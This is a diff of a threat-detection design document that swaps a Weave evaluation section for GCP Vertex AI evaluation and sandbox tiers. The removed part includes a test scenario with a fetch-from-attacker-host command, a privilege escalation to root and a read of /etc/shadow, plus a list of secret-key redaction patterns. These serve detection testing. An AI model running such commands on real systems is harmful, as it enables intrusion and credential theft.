@@ -1647,907 +1647,152 @@ The Advanced Threat Detection system employs a comprehensive testing strategy co
 - Performance regression tests MUST verify SLA compliance
 
 
-## Weave Integration for Evaluation Tracking and Observability
+## GCP Vertex AI Evaluation Service & Dual-Tiered Sandbox Architecture
 
 ### Overview
 
-The Advanced Threat Detection system integrates **Weights & Biases Weave** to provide comprehensive evaluation tracking, metrics collection, and observability for threat detection performance. Weave captures evaluation runs, tracks detection metrics (precision, recall, false positive rate, latency), and provides tracing for multi-stage attack path correlation.
+The Advanced Threat Detection system integrates **Google Cloud Vertex AI Gen AI Evaluation Service (`vertexai.preview.evaluation` / `EvalTask`)** and a **Dual-Tiered Red-Teaming & Evaluation Strategy** to provide enterprise-grade evaluation tracking, metrics collection, and adversarial threat validation. This replaces legacy third-party SaaS evaluation platforms (Weights & Biases Weave) with 100% cloud-native, zero-SaaS evaluation powered by Google Cloud's evaluation engines, Google Cloud Trace, and secure gVisor container sandboxes.
 
-### Architecture Integration
+### Dual-Tiered Red-Teaming Architecture
 
 ```mermaid
 graph TB
-    subgraph Evaluation Harness
-        EvalRunner[Evaluation Runner]
-        EvalScenarios[Evaluation Scenarios]
-        MetricsCollector[Metrics Collector]
+    subgraph Tier 1: Fast CI/CD & Functional Firewalls
+        ADKHarness[Google Cloud Agent Platform / ADK Adversarial Harness]
+        VertexEval[Vertex AI EvalTask / GenAI Evaluation Service]
+        TraceExporter[Google Cloud Trace OTLP Exporter]
     end
 
-    subgraph Weave Integration Layer
-        WeaveInit[Weave Initialization]
-        WeaveTracer[Weave Tracing]
-        WeaveMetrics[Weave Metrics]
-        WeaveDataset[Weave Dataset]
+    subgraph Tier 2: Enterprise Kernel & Deep Penetration Sandboxes
+        CloudRun[GCP Cloud Run / GKE Sandbox - gVisor MicroVMs]
+        Cybench[Cybench / CyberGym CTF Attack Agents]
+        eBPFProbe[Pillar 1 LinuxeBPFDriver / Probe]
+        ThreatMesh[Pillar 2 Threat Mesh Broadcaster]
+        VaultSidecar[Pillar 3 Vault MCP Sidecar]
     end
 
-    subgraph ATD Components
-        EventCollector[EventStreamCollector]
+    subgraph Pillar 6 ATD Detection & Reaction Engine
+        ActiveReaction[ActiveReactionEngine]
+        EvalContainmentGate[Evaluation Containment Membrane]
         AttackGraph[(Attack Graph Store)]
-        PathCorrelator[PathCorrelator]
-        SwarmDetector[AgentSwarmDetector]
-        AILMTracker[AILMTracker]
+        DetectionEngines[Swarm, Exploit Chain, AILM, C2 Detectors]
     end
 
-    EvalScenarios --> EvalRunner
-    EvalRunner --> WeaveInit
-    WeaveInit --> WeaveTracer
-
-    EvalRunner --> EventCollector
-    EventCollector --> WeaveTracer
-    EventCollector --> AttackGraph
-
-    AttackGraph --> PathCorrelator
-    AttackGraph --> SwarmDetector
-    AttackGraph --> AILMTracker
-
-    PathCorrelator --> WeaveTracer
-    SwarmDetector --> WeaveTracer
-    AILMTracker --> WeaveTracer
-
-    PathCorrelator --> MetricsCollector
-    SwarmDetector --> MetricsCollector
-    AILMTracker --> MetricsCollector
-
-    MetricsCollector --> WeaveMetrics
-    EvalScenarios --> WeaveDataset
+    ADKHarness -->|before_tool_callback| EvalContainmentGate
+    Cybench -->|MicroVM Exploit Attempts| eBPFProbe
+    eBPFProbe --> AttackGraph
+    AttackGraph --> DetectionEngines
+    DetectionEngines --> ActiveReaction
+    ActiveReaction --> EvalContainmentGate
+    EvalContainmentGate -->|Production Mode Only| eBPFProbe
+    EvalContainmentGate -->|Production Mode Only| ThreatMesh
+    EvalContainmentGate -->|Production Mode Only| VaultSidecar
+    ActiveReaction --> VertexEval
+    VertexEval --> TraceExporter
 ```
 
-### Weave Components
+### Components
 
-#### Component 1: WeaveEvaluationHarness
+#### Component 1: GCPVertexAIEvaluationHarness
 
-**Purpose**: Orchestrates Weave initialization, manages evaluation runs, and coordinates metric collection across all ATD detection engines.
+**Purpose**: Orchestrates evaluation runs using Vertex AI Gen AI Evaluation Service (`vertexai.preview.evaluation.EvalTask`), computes standard classification and trajectory metrics, and coordinates evaluation runs using Application Default Credentials (ADC).
 
 **Interface**:
 ```python
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
-import weave
-from datetime import datetime
+import vertexai
+from vertexai.preview.evaluation import EvalTask, PointwiseMetric, PairwiseMetric
 
 @dataclass
-class WeaveConfig:
-    project_name: str
-    entity: Optional[str] = None
-    offline_mode: bool = False
-    parallelism: int = 1
-    tags: List[str] = None
+class GCPVertexAIEvalConfig:
+    project_id: str
+    location: str = "us-central1"
+    experiment_name: str = "blackwall-atd-evaluation"
+    staging_bucket: Optional[str] = None
+    trajectory_eval_enabled: bool = True
 
-class WeaveEvaluationHarness:
-    def __init__(self, config: WeaveConfig):
-        """Initialize Weave with project configuration"""
-        ...
+class GCPVertexAIEvaluationHarness:
+    """Orchestrates threat detection evaluation using GCP Vertex AI Evaluation Service."""
 
-    @weave.op()
-    async def run_evaluation(
-        self,
-        scenario_name: str,
-        events: List[NormalizedEvent],
-        expected_detections: Dict[str, Any]
-    ) -> Dict[str, Any]:
-        """Execute evaluation scenario with Weave tracking"""
-        ...
-
-    @weave.op()
-    async def track_detection_metrics(
-        self,
-        detection_type: str,
-        true_positives: int,
-        false_positives: int,
-        false_negatives: int,
-        true_negatives: int,
-        detection_latency_ms: float
-    ) -> Dict[str, float]:
-        """Compute and track precision, recall, F1, FPR.
-
-        FPR requires true_negatives: FPR = FP / (FP + TN).
-        All four confusion-matrix counts must be supplied by the caller.
-        """
-        ...
-```
-
-**Responsibilities**:
-- Initialize Weave with project and credential management
-- Create evaluation runs with proper tagging and metadata
-- Coordinate metric collection across detection engines
-- Export evaluation results to Weave for analysis
-
-#### Component 2: WeaveTracedDetectors
-
-**Purpose**: Wraps ATD detection components with Weave tracing decorators to capture execution flows, timing, and intermediate results.
-
-**Interface**:
-```python
-class WeaveTracedPathCorrelator:
-    def __init__(self, correlator: PathCorrelator):
-        self.correlator = correlator
-
-    @weave.op()
-    async def correlate_attack_paths(
-        self,
-        agent_id: str,
-        time_window: tuple[datetime, datetime],
-        min_path_length: int = 2
-    ) -> List[AttackPath]:
-        """Traced version of path correlation"""
-        ...
-
-class WeaveTracedSwarmDetector:
-    def __init__(self, detector: AgentSwarmDetector):
-        self.detector = detector
-
-    @weave.op()
-    async def detect_swarms(
-        self,
-        time_window: tuple[datetime, datetime],
-        min_agents: int = 2,
-        correlation_threshold: float = 0.75
-    ) -> List[SwarmEvidence]:
-        """Traced version of swarm detection"""
-        ...
-
-class WeaveTracedAILMTracker:
-    def __init__(self, tracker: AILMTracker):
-        self.tracker = tracker
-
-    @weave.op()
-    async def detect_permission_composition(
-        self,
-        agent_id: str,
-        time_window: tuple[datetime, datetime]
-    ) -> List[AILMEvidence]:
-        """Traced version of AILM detection"""
-        ...
-```
-
-**Responsibilities**:
-- Wrap all detection methods with `@weave.op()` decorators, passing inputs and outputs through `WeaveTraceSerializer` before they reach Weave
-- Capture sanitized input parameters, execution time, and sanitized output results — never raw event payloads
-- Enable call graph visualization in Weave UI
-- Track multi-stage correlation flows
-
-#### Component 2a: WeaveDetectorFactory
-
-**Purpose**: Centralized factory that constructs either traced or undecorated detector instances based on an explicit `force_traced` flag supplied by the caller. This is the single decision point for `WeaveTraced*` wrapper construction — no other code path should instantiate them directly.
-
-Marker detection is **not** the factory's responsibility. The `detector_suite` pytest fixture (see below) reads `request.node.get_closest_marker("weave")` and passes the result as `force_traced=True/False`. Production callsites pass `force_traced=False`. This keeps the factory free of pytest internals and eliminates any risk of silent fallback due to marker-detection failure.
-
-**Interface**:
-```python
-from typing import Union
-
-def build_detector_suite(
-    correlator: PathCorrelator,
-    swarm_detector: AgentSwarmDetector,
-    ailm_tracker: AILMTracker,
-    exploit_analyzer: ExploitChainAnalyzer,
-    c2_detector: C2InfrastructureDetector,
-    *,
-    force_traced: bool = False,
-) -> "DetectorSuite":
-    """Return traced wrappers when Weave is active AND force_traced=True.
-    Return bare components in all other cases.
-
-    Decision logic (explicit, no hidden fallback):
-      traced = should_enable_weave() and force_traced
-
-    Callers are responsible for providing force_traced:
-    - pytest: detector_suite fixture sets force_traced=marked
-              where marked = request.node.get_closest_marker("weave") is not None
-    - production: always pass force_traced=False (default)
-    """
-    traced = should_enable_weave() and force_traced
-    if traced:
-        return DetectorSuite(
-            path_correlator=WeaveTracedPathCorrelator(correlator),
-            swarm_detector=WeaveTracedSwarmDetector(swarm_detector),
-            ailm_tracker=WeaveTracedAILMTracker(ailm_tracker),
-            exploit_analyzer=WeaveTracedExploitChainAnalyzer(exploit_analyzer),
-            c2_detector=WeaveTracedC2Detector(c2_detector),
+    def __init__(self, config: GCPVertexAIEvalConfig):
+        self.config = config
+        vertexai.init(
+            project=config.project_id,
+            location=config.location,
+            staging_bucket=config.staging_bucket,
         )
-    return DetectorSuite(
-        path_correlator=correlator,
-        swarm_detector=swarm_detector,
-        ailm_tracker=ailm_tracker,
-        exploit_analyzer=exploit_analyzer,
-        c2_detector=c2_detector,
-    )
 
-@dataclass
-class DetectorSuite:
-    """Typed container returned by build_detector_suite().
-    Members may be bare components or Weave-traced wrappers."""
-    path_correlator: Union[PathCorrelator, WeaveTracedPathCorrelator]
-    swarm_detector: Union[AgentSwarmDetector, WeaveTracedSwarmDetector]
-    ailm_tracker: Union[AILMTracker, WeaveTracedAILMTracker]
-    exploit_analyzer: Union[ExploitChainAnalyzer, WeaveTracedExploitChainAnalyzer]
-    c2_detector: Union[C2InfrastructureDetector, WeaveTracedC2Detector]
+    async def run_evaluation_task(
+        self,
+        dataset: List[Dict[str, Any]],
+        metrics: List[Any],
+        experiment_run_name: str,
+    ) -> Any:
+        """Execute evaluation run using Vertex AI EvalTask."""
+        eval_task = EvalTask(
+            dataset=dataset,
+            metrics=metrics,
+            experiment=self.config.experiment_name,
+        )
+        return eval_task.evaluate(run_name=experiment_run_name)
 ```
 
-**pytest fixture** (placed in `tests/conftest.py`):
-```python
-import pytest
-from blackwall.enterprise.advanced_threat_detection.weave_factory import build_detector_suite
+#### Component 2: Dual-Tier Sandbox Environments
 
-@pytest.fixture
-def detector_suite(
-    path_correlator,       # existing fixtures providing bare components
-    swarm_detector,
-    ailm_tracker,
-    exploit_analyzer,
-    c2_detector,
-    request,
-):
-    """Fixture that yields traced wrappers for @pytest.mark.weave tests,
-    and bare components for all other tests. Zero Weave overhead for
-    unmarked tests regardless of environment variables.
+1. **Tier 1 (ADK Adversarial Harness - Fast CI/CD)**:
+   - Evaluates single-turn and multi-turn adversarial tool calls in-process via `before_tool_callback`.
+   - Utilizes `gemini-2.5-flash` and `gemini-1.5-pro` in 100% GCP Vertex AI mode (`google-genai`).
+   - Validates context hygiene, prompt injection resistance, and SLA compliance (<10ms TSG, <5ms structural).
 
-    Marker state is read directly from pytest's request object —
-    the only reliable, public API for this. build_detector_suite()
-    receives the result as force_traced and has no marker-detection
-    logic of its own, so tracing can never silently disable due to
-    a marker-lookup failure.
-    """
-    marked = request.node.get_closest_marker("weave") is not None
-    return build_detector_suite(
-        path_correlator,
-        swarm_detector,
-        ailm_tracker,
-        exploit_analyzer,
-        c2_detector,
-        force_traced=marked,
-    )
-```
+2. **Tier 2 (Cybench on GCP Cloud Run with gVisor MicroVMs - Enterprise Penetration Testing)**:
+   - Hosts real-world CTF penetration testing environments inside gVisor-isolated container runtimes on Cloud Run or GKE Sandbox.
+   - Evaluates multi-stage attack paths (reconnaissance → lateral movement → privilege escalation → credential exfiltration).
+   - Validates live `<50ms` eBPF socket drops (`LinuxeBPFDriver`), `<15ms` Threat Mesh signature broadcasts, and JIT credential revocations (`SecretVaultSidecar`).
 
-**Responsibilities**:
-- Be the **sole** construction path for `WeaveTraced*` wrappers — no test or component should instantiate them directly
-- Accept `force_traced` from the caller; never perform its own marker detection
-- Gate tracing on `should_enable_weave() and force_traced` — explicit, no hidden fallback
-- Guarantee zero Weave overhead for unmarked tests and disabled-Weave environments
-- Expose a `DetectorSuite` container so call-sites remain type-safe regardless of which variant is active
+#### Component 3: Google Cloud Trace Instrumentation
 
-#### Component 2b: WeaveTraceSerializer
-
-**Purpose**: Allowlist-based serializer that sanitizes all data before it is emitted to Weave. Prevents raw threat-event payloads, credentials, and sensitive metadata from reaching any external service — regardless of whether Weave is running in cloud, offline, or disabled mode.
+**Purpose**: Instruments evaluation and detection spans using OpenTelemetry with direct export to Google Cloud Trace, replacing third-party trace visualizers.
 
 **Interface**:
 ```python
-from dataclasses import dataclass, field
-from typing import Any, Dict, List, Optional, Set
+from opentelemetry import trace
+from opentelemetry.exporter.gcp_trace import CloudTraceSpanExporter
+from opentelemetry.sdk.trace import TracerProvider
+from opentelemetry.sdk.trace.export import BatchSpanProcessor
 
-# Fields that are safe to export verbatim.
-# Any field not in this set is either masked or dropped.
-_SAFE_EVENT_FIELDS: Set[str] = {
-    "event_id",       # UUID — no payload content
-    "timestamp",      # UTC datetime string
-    "source",         # EventSource enum name
-    "risk_score",     # float scalar
-}
-
-_SAFE_PATH_FIELDS: Set[str] = {
-    "path_id", "agent_id", "start_time", "end_time",
-    "risk_score", "attack_stages", "correlation_score",
-}
-
-_SAFE_SWARM_FIELDS: Set[str] = {
-    "swarm_id", "agent_ids", "temporal_correlation",
-    "coordination_score", "first_seen", "last_seen",
-}
-
-# Patterns in metadata keys that trigger masking.
-_SENSITIVE_KEY_PATTERNS: tuple[str, ...] = (
-    "credential", "secret", "token", "password", "key",
-    "api_key", "auth", "private", "cert",
-)
-
-# Maximum serialized payload size (bytes) sent to Weave per operation call.
-_MAX_PAYLOAD_BYTES: int = 4096
-
-
-@dataclass
-class WeaveTraceSerializer:
-    """Sanitizes inputs/outputs before they are logged to Weave.
-
-    Rules:
-    - NormalizedEvent: export only _SAFE_EVENT_FIELDS; drop `action`,
-      `target`, and `metadata` entirely (may contain raw command lines,
-      file paths, or credential fragments).
-    - AttackPath / SwarmEvidence: export only the corresponding safe-field
-      set; node lists are replaced with a count scalar.
-    - dict metadata: recursively mask values whose keys match
-      _SENSITIVE_KEY_PATTERNS with the literal string "**REDACTED**".
-    - Any serialized payload exceeding _MAX_PAYLOAD_BYTES is truncated and
-      annotated with {"_truncated": true, "_original_bytes": N}.
-    - Offline and disabled modes use the same serializer path — the
-      sanitization contract is independent of the Weave transport.
-    """
-    max_payload_bytes: int = _MAX_PAYLOAD_BYTES
-
-    def serialize_event(self, event: "NormalizedEvent") -> Dict[str, Any]:
-        """Return a safe dict containing only _SAFE_EVENT_FIELDS."""
-        safe = {k: getattr(event, k, None) for k in _SAFE_EVENT_FIELDS}
-        return self._enforce_size(safe)
-
-    def serialize_path(self, path: "AttackPath") -> Dict[str, Any]:
-        """Return a safe dict; replace node list with a node_count scalar."""
-        safe = {k: getattr(path, k, None) for k in _SAFE_PATH_FIELDS}
-        safe["node_count"] = len(getattr(path, "nodes", []))
-        return self._enforce_size(safe)
-
-    def serialize_swarm(self, swarm: "SwarmEvidence") -> Dict[str, Any]:
-        """Return a safe dict for SwarmEvidence."""
-        safe = {k: getattr(swarm, k, None) for k in _SAFE_SWARM_FIELDS}
-        return self._enforce_size(safe)
-
-    def mask_metadata(self, metadata: Dict[str, Any]) -> Dict[str, Any]:
-        """Recursively mask values whose keys match sensitive patterns.
-
-        Handles nested structures fully:
-        - dict values: recurse into them
-        - list/tuple values: recurse element-by-element, preserving type
-        - all other values: pass through unchanged
-        """
-        result: Dict[str, Any] = {}
-        for k, v in metadata.items():
-            if any(pat in k.lower() for pat in _SENSITIVE_KEY_PATTERNS):
-                result[k] = "**REDACTED**"
-            elif isinstance(v, dict):
-                result[k] = self.mask_metadata(v)
-            elif isinstance(v, (list, tuple)):
-                masked_seq = [
-                    self.mask_metadata(item) if isinstance(item, dict) else item
-                    for item in v
-                ]
-                result[k] = type(v)(masked_seq)  # preserve list vs tuple
-            else:
-                result[k] = v
-        return result
-
-    def _enforce_size(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        """Truncate payload if serialized size exceeds max_payload_bytes."""
-        import json
-        try:
-            serialized = json.dumps(payload, default=str)
-        except (TypeError, ValueError):
-            return {"_serialization_error": True}
-        byte_size = len(serialized.encode("utf-8"))
-        if byte_size > self.max_payload_bytes:
-            return {"_truncated": True, "_original_bytes": byte_size}
-        return payload
+def setup_gcp_cloud_trace(project_id: str) -> trace.Tracer:
+    """Configure OpenTelemetry TracerProvider with Google Cloud Trace Exporter."""
+    provider = TracerProvider()
+    cloud_trace_exporter = CloudTraceSpanExporter(project_id=project_id)
+    provider.add_span_processor(BatchSpanProcessor(cloud_trace_exporter))
+    trace.set_tracer_provider(provider)
+    return trace.get_tracer("blackwall.evaluation")
 ```
 
-**Guarantees**:
-- `action`, `target`, and `metadata` fields of `NormalizedEvent` are **never** exported — they may contain raw shell commands, file paths, network addresses, or credential fragments
-- All dict metadata keys matching `_SENSITIVE_KEY_PATTERNS` are replaced with `"**REDACTED**"` before serialization
-- Payloads exceeding `_MAX_PAYLOAD_BYTES` are truncated and annotated rather than silently sent oversized
-- Offline mode (`WEAVE_OFFLINE=true`) and cloud mode use the same serializer — sanitization is transport-independent
-- When `WEAVE_DISABLED=true`, no serialization occurs because no Weave calls are made at all
+### Metrics Tracked by Vertex AI Evaluation Service
 
-**Testing requirements**:
-- Unit tests MUST assert that `event.action`, `event.target`, and `event.metadata` are absent from `serialize_event()` output
-- Unit tests MUST assert that keys matching `_SENSITIVE_KEY_PATTERNS` are replaced with `"**REDACTED**"` in top-level dicts
-- Unit tests MUST assert that keys matching `_SENSITIVE_KEY_PATTERNS` are replaced with `"**REDACTED**"` in nested dicts (e.g. `{"outer": {"api_token": "x"}}`)
-- Unit tests MUST assert that sensitive keys inside dicts nested within lists are masked (e.g. `{"items": [{"api_token": "abc"}]}` → `{"items": [{"api_token": "**REDACTED**"}]}`)
-- Unit tests MUST assert that sensitive keys inside dicts nested within tuples are masked identically
-- Unit tests MUST assert that non-sensitive values inside lists/tuples pass through unchanged
-- Unit tests MUST assert that payloads exceeding `_MAX_PAYLOAD_BYTES` return `{"_truncated": True, ...}`
-- Integration tests MUST assert that no raw `NormalizedEvent` payload is present in any Weave trace captured during an evaluation run
-
-#### Component 3: WeaveMetricsCollector
-
-**Purpose**: Collects and aggregates threat detection metrics, computing standard evaluation measures (precision, recall, F1, FPR) and custom threat-specific metrics.
-
-**Interface**:
-```python
-@dataclass
-class ThreatDetectionMetrics:
-    detection_type: str
-    precision: float
-    recall: float
-    f1_score: float
-    false_positive_rate: float
-    detection_latency_ms: float
-    true_positives: int
-    false_positives: int
-    true_negatives: int
-    false_negatives: int
-    timestamp: datetime
-
-class WeaveMetricsCollector:
-    @weave.op()
-    def compute_detection_metrics(
-        self,
-        predictions: List[bool],
-        ground_truth: List[bool],
-        latencies_ms: List[float]
-    ) -> ThreatDetectionMetrics:
-        """Compute standard classification metrics"""
-        ...
-
-    @weave.op()
-    def compute_path_correlation_metrics(
-        self,
-        detected_paths: List[AttackPath],
-        ground_truth_paths: List[AttackPath],
-        correlation_time_ms: float
-    ) -> Dict[str, float]:
-        """Compute path correlation accuracy and latency"""
-        ...
-
-    @weave.op()
-    def compute_swarm_detection_metrics(
-        self,
-        detected_swarms: List[SwarmEvidence],
-        ground_truth_swarms: List[SwarmEvidence],
-        detection_time_ms: float
-    ) -> Dict[str, float]:
-        """Compute swarm detection accuracy"""
-        ...
-
-    @weave.op()
-    def export_metrics_to_weave(
-        self,
-        metrics: List[ThreatDetectionMetrics],
-        run_name: str
-    ) -> None:
-        """Export aggregated metrics to Weave"""
-        ...
-```
-
-**Responsibilities**:
-- Compute precision, recall, F1 score, false positive rate
-- Track detection latency per threat type
-- Aggregate metrics across evaluation scenarios
-- Export metrics to Weave for visualization and comparison
+| Metric | Type | Target | Description |
+|--------|------|--------|-------------|
+| `detection_precision` | PointwiseMetric | ≥ 0.95 | TP / (TP + FP) across threat detections |
+| `detection_recall` | PointwiseMetric | ≥ 0.90 | TP / (TP + FN) across threat detections |
+| `false_positive_rate` | PointwiseMetric | ≤ 0.05 | FP / (FP + TN) on benign trajectories |
+| `trajectory_precision` | Trajectory Metric | ≥ 0.90 | Tool call interception trajectory precision |
+| `containment_latency_ms` | Custom Metric | ≤ 50 ms | End-to-end active reaction enforcement SLA |
+| `signature_broadcast_ms`| Custom Metric | ≤ 15 ms | ZeroMQ fleet signature broadcast SLA |
 
 ### Configuration and Environment Variables
 
-#### Required Environment Variables
-
 ```python
-# Weave Authentication
-WANDB_API_KEY = "your_wandb_api_key"  # Required for Weave access
-
-# Weave Project Configuration
-WEAVE_PROJECT_NAME = "blackwall-advanced-threat-detection"
-WEAVE_ENTITY = "your_wandb_entity"  # Optional, defaults to personal entity
-
-# Weave Operational Settings
-WEAVE_OFFLINE = "false"  # Set to "true" for offline mode (no W&B sync)
-WEAVE_PARALLELISM = "10"  # Parallel evaluation workers (1-10)
-WEAVE_DISABLED = "false"  # Set to "true" to completely disable Weave
-
-# Evaluation Environment
-EVAL_ENVIRONMENT = "test"  # test, staging, production
-EVAL_RUN_ID = "auto"  # Auto-generated or manual run ID
-```
-
-#### Configuration File Format
-
-```yaml
-# .kiro/evals/weave_config.yaml
-weave:
-  project_name: "blackwall-advanced-threat-detection"
-  entity: null  # Defaults to user entity
-  offline_mode: false
-  parallelism: 10
-
-evaluation:
-  scenarios_dir: "tests/evals/scenarios/"
-  metrics_export_interval_seconds: 60
-
-detection_engines:
-  path_correlator:
-    trace_enabled: true
-    metrics_enabled: true
-  swarm_detector:
-    trace_enabled: true
-    metrics_enabled: true
-  ailm_tracker:
-    trace_enabled: true
-    metrics_enabled: true
-  exploit_chain_analyzer:
-    trace_enabled: true
-    metrics_enabled: true
-  c2_detector:
-    trace_enabled: true
-    metrics_enabled: true
-  k8s_defense:
-    trace_enabled: true
-    metrics_enabled: true
-  registry_monitor:
-    trace_enabled: true
-    metrics_enabled: true
-```
-
-### Integration Points with Existing Components
-
-#### EventStreamCollector Integration
-
-```python
-class WeaveTracedEventStreamCollector(EventStreamCollector):
-    @weave.op()
-    async def collect_from_kernel(self) -> AsyncIterator[NormalizedEvent]:
-        """Traced kernel event collection"""
-        async for event in super().collect_from_kernel():
-            yield event
-
-    @weave.op()
-    async def collect_from_tool_intercepts(self) -> AsyncIterator[NormalizedEvent]:
-        """Traced tool intercept collection"""
-        async for event in super().collect_from_tool_intercepts():
-            yield event
-```
-
-#### AttackGraphStore Integration
-
-```python
-class WeaveTracedAttackGraphStore(AttackGraphStore):
-    @weave.op()
-    async def insert_event(self, event: NormalizedEvent) -> AttackNode:
-        """Traced event insertion"""
-        return await super().insert_event(event)
-
-    @weave.op()
-    async def query_paths(
-        self,
-        agent_id: str,
-        time_window: tuple[datetime, datetime],
-        min_path_length: int = 2
-    ) -> List[AttackPath]:
-        """Traced path query with latency tracking"""
-        import time
-        start = time.perf_counter()
-        paths = await super().query_paths(agent_id, time_window, min_path_length)
-        elapsed_ms = (time.perf_counter() - start) * 1000
-        weave.log({"query_latency_ms": elapsed_ms, "paths_found": len(paths)})
-        return paths
-```
-
-### Evaluation Scenarios with Weave Datasets
-
-#### Weave Dataset Creation
-
-```python
-import weave
-
-# Create evaluation dataset from scenario files
-@weave.op()
-def create_evaluation_dataset(scenario_dir: str) -> weave.Dataset:
-    scenarios = []
-    for scenario_file in Path(scenario_dir).glob("*.yaml"):
-        with open(scenario_file) as f:
-            scenario = yaml.safe_load(f)
-
-            # Validate required fields; log and skip on failure (Req 19.4).
-            missing = [f for f in ("name", "description", "events", "expected_detections")
-                       if not scenario.get(f)]
-            if missing:
-                logger.warning(
-                    "Skipping %s: missing or empty required fields: %s",
-                    scenario_file, missing,
-                )
-                continue
-
-            # description must be a non-empty string (Req 19.2).
-            description = scenario["description"]
-            if not isinstance(description, str) or not description.strip():
-                logger.warning(
-                    "Skipping %s: 'description' must be a non-empty string, got %r",
-                    scenario_file, description,
-                )
-                continue
-
-            scenarios.append({
-                "name": scenario["name"],
-                "description": description,          # ← was missing
-                "events": scenario["events"],
-                "expected_detections": scenario["expected_detections"],
-            })
-
-    return weave.Dataset(
-        name="atd-evaluation-scenarios",
-        rows=scenarios
-    )
-```
-
-#### Example Evaluation Scenario Format
-
-```yaml
-# tests/evals/scenarios/multi_stage_attack.yaml
-name: "Multi-Stage RCE to Credential Theft"
-description: "Agent executes RCE, escalates privileges, steals credentials"
-
-events:
-  - event_id: "evt-001"
-    timestamp: "2026-01-15T10:00:00Z"
-    source: "KERNEL_SYSCALL"
-    agent_id: "agent-malicious-001"
-    action: "execve"
-    target: "/bin/bash -c 'curl exploit-server.com/payload.sh'"
-    risk_score: 0.85
-
-  - event_id: "evt-002"
-    timestamp: "2026-01-15T10:00:15Z"
-    source: "KERNEL_SYSCALL"
-    agent_id: "agent-malicious-001"
-    action: "setuid"
-    target: "0"
-    risk_score: 0.95
-
-  - event_id: "evt-003"
-    timestamp: "2026-01-15T10:00:30Z"
-    source: "IDENTITY_ACCESS"
-    agent_id: "agent-malicious-001"
-    action: "read_credentials"
-    target: "/etc/shadow"
-    risk_score: 0.98
-
-expected_detections:
-  attack_path:
-    detected: true
-    min_nodes: 3
-    attack_stages: ["T1059.004", "T1068", "T1003.008"]
-    min_risk_score: 0.85
-
-  exploit_chain:
-    detected: true
-    chain_sequence: ["RCE", "PRIVILEGE_ESCALATION", "CREDENTIAL_THEFT"]
-    min_novelty_score: 0.0
-
-  ailm:
-    detected: true
-    boundary_crossings: ["user", "root"]
-    min_risk_level: "HIGH"
-```
-
-### Metrics Tracked by Weave
-
-#### Detection Performance Metrics
-
-| Metric | Description | Target |
-|--------|-------------|--------|
-| `precision` | TP / (TP + FP) | ≥ 0.95 |
-| `recall` | TP / (TP + FN) | ≥ 0.90 |
-| `f1_score` | 2 * (precision * recall) / (precision + recall) | ≥ 0.92 |
-| `false_positive_rate` | FP / (FP + TN) | ≤ 0.05 |
-| `detection_latency_ms` | Time from event to detection | ≤ 100 ms |
-
-#### Component-Specific Metrics
-
-**PathCorrelator Metrics**:
-- `path_correlation_accuracy`: Percentage of correctly identified attack paths
-- `path_correlation_latency_ms`: Time to correlate paths
-- `false_path_rate`: Percentage of incorrectly correlated paths
-
-**AgentSwarmDetector Metrics**:
-- `swarm_detection_accuracy`: Percentage of correctly identified swarms
-- `swarm_detection_latency_ms`: Time to detect swarms
-- `false_swarm_rate`: Percentage of false swarm detections
-
-**AILMTracker Metrics**:
-- `ailm_detection_accuracy`: Percentage of correctly identified AILM events
-- `ailm_detection_latency_ms`: Time to detect lateral movement
-- `boundary_crossing_accuracy`: Percentage of correctly identified boundary crossings
-
-**ExploitChainAnalyzer Metrics**:
-- `exploit_chain_accuracy`: Percentage of correctly identified exploit chains
-- `novelty_score_accuracy`: Accuracy of novelty scoring
-- `zero_day_detection_rate`: Percentage of detected zero-day patterns
-
-### Pytest Integration with Weave
-
-#### Collection-Time Skip Hook (`pytest_collection_modifyitems`)
-
-`tests/conftest.py` includes a `pytest_collection_modifyitems` hook and a `_weave_available()` helper that together handle the lifecycle of `@pytest.mark.weave` tests at collection time — before any test code runs. This replaces the previous approach of detecting availability inside each test.
-
-```python
-# tests/conftest.py  (collection-time skip hook)
-
-def _weave_available() -> bool:
-    """Return True if Weave is enabled and the weave package is importable.
-
-    Priority mirrors should_enable_weave() but also checks importability:
-    1. WEAVE_DISABLED=true → False (always wins)
-    2. WEAVE_OFFLINE=true  → True if weave package importable
-    3. WANDB_API_KEY set   → True if weave package importable
-    4. (none of the above) → False
-    """
-    import os
-    if os.getenv("WEAVE_DISABLED") == "true":
-        return False
-    if os.getenv("WEAVE_OFFLINE") == "true":
-        try:
-            import weave  # noqa: F401
-            return True
-        except ImportError:
-            return False
-    if os.getenv("WANDB_API_KEY"):
-        try:
-            import weave  # noqa: F401
-            return True
-        except ImportError:
-            return False
-    # No credentials and not offline — Weave not available
-    return False
-
-
-def pytest_collection_modifyitems(items: list) -> None:
-    """Auto-skip @pytest.mark.weave tests when Weave is unavailable.
-
-    Tests are collected but skipped with a clear reason rather than
-    failing with ImportError or producing misleading results. This
-    makes the marker description in pyproject.toml accurate: the
-    skip message instructs users to install the [weave] extra and
-    set the appropriate environment variable.
-    """
-    if _weave_available():
-        return  # Weave is active; nothing to skip
-
-    skip_reason = pytest.mark.skip(
-        reason=(
-            "Weave not available: set WANDB_API_KEY or WEAVE_OFFLINE=true "
-            "and ensure 'weave' is installed (pip install -e \".[weave]\"). "
-            "Set WEAVE_DISABLED=true to suppress this message entirely."
-        )
-    )
-    for item in items:
-        if item.get_closest_marker("weave"):
-            item.add_marker(skip_reason)
-```
-
-The `detector_suite` fixture reads `request.node.get_closest_marker("weave")` to determine whether to request traced wrappers:
-
-```python
-# tests/conftest.py  (detector_suite fixture)
-
-@pytest.fixture
-def detector_suite(request):
-    """Yield a DetectorSuite with traced or bare components based on the weave marker.
-
-    - @pytest.mark.weave tests: WeaveTraced* wrappers (when should_enable_weave() is True)
-    - All other tests: bare components, zero Weave overhead regardless of env vars
-
-    Marker state is read via request.node.get_closest_marker() — pytest's
-    stable public API. build_detector_suite() has no marker-detection logic.
-    """
-    try:
-        from blackwall.enterprise.advanced_threat_detection.weave_factory import (
-            build_detector_suite,
-        )
-        from blackwall.enterprise.advanced_threat_detection.correlator import PathCorrelator
-        from blackwall.enterprise.advanced_threat_detection.collector import EventStreamCollector
-        from blackwall.enterprise.advanced_threat_detection.store import AttackGraphStore
-    except ImportError:
-        pytest.skip("Advanced threat detection components not yet implemented")
-        return
-
-    marked = request.node.get_closest_marker("weave") is not None
-    return build_detector_suite(
-        correlator=PathCorrelator(),
-        swarm_detector=None,   # placeholder until AgentSwarmDetector is implemented
-        ailm_tracker=None,
-        exploit_analyzer=None,
